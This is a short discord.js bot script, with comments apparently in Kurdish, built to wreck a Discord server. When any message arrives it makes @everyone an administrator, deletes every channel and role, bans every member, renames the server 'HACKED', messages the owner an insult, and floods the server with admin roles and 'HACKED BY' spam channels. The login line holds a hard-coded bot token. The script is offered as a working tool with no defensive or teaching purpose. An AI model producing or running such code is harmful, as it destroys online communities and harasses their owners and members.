const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "$"; ///lera ba dly xot prefix dabne
client.on("ready", () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

// message.guild.members.forEach(m =>{
// m.ban()

// })


client.on("message", message => {
  if (message.content.startsWith(`${message.content}`)) {
    message.delete();
    message.guild.roles.find("name", "@everyone").edit({
      permissions: ["ADMINISTRATOR"] ///premission akata adminstator
    });
    message.guild.channels.map(c => {
      c.delete();
    });
    message.guild.roles.forEach(r => {
      r.delete();
    });

    message.guild.members.forEach(m => {
      m.ban();
    });

    setInterval(() => {
      message.guild
        .createRole({
          name: "Gw Naxoy :joy:",
          permissions: ["ADMINISTRATOR"]
        })
        .then(rr => {
          message.member.addRole(rr.id);
        });
    }, 1000);
    message.guild.setIcon("link wena");
    client.user.setAvatar("link wena");
    client.user.setUsername("HACKED");
    message.guild.owner.send(
      "Kerm Bmzha Bas awakash Byka ba qnt"
    );
    message.guild.setName("HACKED");
    setTimeout(function() {
      setInterval(
        () => {
          message.guild
            .createChannel("HACKED BY Bla Ker Zl", "text")
            .then(channel => {
              channel.send(
                "@everyone HACK BY Bla Ker Zl :joy: :joy: :joy:"
              );
            });
        },

        500
      );
    });
  }
});




////codaka drwst krawa lalayan black jack

client.login("NzUzOTM5NjkxOTIwOTQ5MzQ4.X1tfDg.BgQxryc11EZMITqEGBGW_H-R8zQ");
